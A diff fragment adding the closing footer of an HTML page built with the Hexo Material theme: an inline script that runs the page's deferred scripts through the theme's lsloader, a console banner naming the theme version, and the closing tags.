+</script>
+
+<!-- Custom Footer -->
+
+
+
+<script>
+    (function(){
+        var scriptList = document.querySelectorAll('script[type="text/ls-javascript"]')
+
+        for (var i = 0; i < scriptList.length; ++i) {
+            var item = scriptList[i];
+            lsloader.runInlineScript(item.id,item.id);
+        }
+    })()
+console.log('\n %c © Material Theme | Version: 1.5.2 | https://github.com/viosey/hexo-theme-material %c \n', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-left-radius:5px;border-bottom-left-radius:5px;', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-right-radius:5px;border-bottom-right-radius:5px;');
+</script>
+
+                </main>
+            </div>
+        </body>
+    
+</html>
